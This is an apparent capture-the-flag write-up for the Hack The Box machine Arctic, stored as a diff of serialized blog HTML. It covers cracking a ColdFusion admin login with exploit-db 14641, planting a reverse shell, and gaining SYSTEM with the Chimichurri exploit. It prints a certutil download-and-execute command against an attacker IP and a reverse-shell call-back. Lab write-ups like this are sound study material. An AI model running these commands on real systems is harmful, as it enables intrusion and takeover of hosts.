@@ -1,0 +1,21 @@
+I"�<p>Arctic was an easy one that i wont forget due to how certain exploits are used.</p>
+
+<h1 id="recon">Recon</h1>
+<p>Port scanning shows port 5800 is open serving coldfusion
+Some directory bruteforcing returns CFIDE which will be our admin endpoint.</p>
+
+<h1 id="pwning-the-webapp">Pwning the webapp</h1>
+
+<p>Searching exploit-db, we find a suitable exploit that may assist in getting into the coldfusion admin panel. Exploit 14641 does some amazing things, it will retrieve the password hash of the admin/user of the panel and inject it into the html of the login form!
+From this we get the password of ‘happyday’. From there, gaining a reverse shell through coldfusion is fairly stock standard. Setup a scheduled task with an upload and output file with a web directory then upload a shell. Run the task and navigate to the saved directory with a listener to gain a shell as arctic\tolis</p>
+
+<h1 id="gaining-root">Gaining root</h1>
+
+<p>Running ‘systeminfo’ on the box shows us theres no hotfixes installed and its not a brand new os. This particular box shows signs of being vulnerable to &lt;???&gt;. Download the Chimchurri exploit from github. Use a method of file transfer on windows like the following to recieve the file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;run webserver to host file&gt;
+certutil -urlcache -split -f http://10.10.14.4/chimchurri.exe churr.exe
+&lt;execute exploit when new listener is running&gt;
+churr.exe 10.10.14.4 443
+</code></pre></div></div>
+<p>Thats it ! quick and easy root for arctic. 14641 is still one of the simplest and most effective exploits ive seen.</p>
+:ET
